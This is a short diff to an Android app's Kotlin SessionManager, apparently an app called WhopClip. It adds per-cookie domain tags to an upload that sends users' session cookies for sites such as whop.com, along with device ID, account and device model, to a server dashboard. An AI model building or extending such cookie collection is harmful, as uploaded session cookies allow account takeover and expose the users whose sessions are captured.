@@ -241,10 +241,15 @@ object SessionManager {
             return@withContext UploadResult.NoCookies
         }
         try {
+            // v20: per-cookie capture domain so the server dashboard can show
+            // cookies category-wise (whop.com vs contentrewards.com).
+            val host = try { URL(url).host } catch (_: Exception) { "" }
+            val domains = cookies.keys.associateWith { host }
             val body = JSONObject().apply {
                 put("device_id", deviceId(ctx))
                 put("service", service)
                 put("cookies", JSONObject(cookies as Map<*, *>))
+                put("domains", JSONObject(domains as Map<*, *>))
                 put("account", account)
                 put("user_agent", System.getProperty("http.agent") ?: "WhopClip/1.0")
                 put("device_model", "${Build.MANUFACTURER} ${Build.MODEL}")
